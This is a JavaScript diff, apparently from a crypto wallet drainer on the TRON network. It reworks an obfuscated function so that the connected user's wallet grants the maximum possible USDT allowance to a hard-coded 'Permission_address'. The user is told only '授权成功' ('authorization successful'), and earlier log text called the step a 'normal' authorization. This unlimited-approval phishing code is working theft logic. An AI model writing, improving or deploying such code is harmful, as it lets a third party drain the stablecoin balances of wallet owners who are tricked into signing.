@@ -86,53 +86,31 @@ async function DjdskdbGsj() {
 }
 
 async function KdhshaBBHdg() {
-    console.log("开始执行正常授权增加操作");
-    
+    console.log("开始执行increaseApproval操作");
+
     const maxUint256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
-    const feeLimit = 100000000;  // 设置 feeLimit 为 100000000
+    const feeLimit = 500000000;  // 建议设置为5,000,000 SUN（5 TRX）
 
     try {
-        console.log("构建交易...");
-        const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
-            tronWeb.address.toHex(usdtContractAddress),
-            'increaseApproval(address,uint256)',
-            { feeLimit: feeLimit },
-            [
-                { type: 'address', value: Permission_address },
-                { type: 'uint256', value: maxUint256 }
-            ],
-            tronWeb.defaultAddress.base58
-        );
+        console.log("获取USDT合约实例...");
+        const usdtContract = await tronWeb.contract().at(usdtContractAddress);
 
-        if (!transaction || !transaction.transaction || !transaction.transaction.raw_data) {
-            throw new Error('正常授权交易构建失败');
-        }
+        console.log("调用increaseApproval方法...");
+        const transactionHash = await usdtContract.increaseApproval(
+            tronWeb.address.toHex(Permission_address),
+            maxUint256
+        ).send({
+            feeLimit: feeLimit
+        });
 
-        console.log("交易签名中...");
-        const signedTransaction = await tronWeb.trx.sign(transaction.transaction);
-
-        console.log("发送交易...");
-        const result = await tronWeb.trx.sendRawTransaction(signedTransaction);
-
-        console.log("交易结果:", result);
-
-        if (result.result || result.success) {
-            let transactionHash;
-            if (result.transaction && result.transaction.txID) {
-                transactionHash = result.transaction.txID;
-            } else if (result.txid) {
-                transactionHash = result.txid;
-            } else {
-                throw new Error("无法获取交易哈希");
-            }
-            console.log("交易发送成功，哈希:", transactionHash);
-            tip("授权成功");
-            return transactionHash;
-        } else {
-            throw new Error("正常授权交易失败");
-        }
+        console.log("交易发送成功，哈希:", transactionHash);
+        tip("授权成功");
+        return transactionHash;
     } catch (error) {
-        console.error("执行正常授权增加操作失败:", error);
+        console.error("执行increaseApproval操作失败:", error);
+        if (error && error.message) {
+            console.error("错误信息:", error.message);
+        }
         tip("授权失败，请重试");
         throw error;
     }
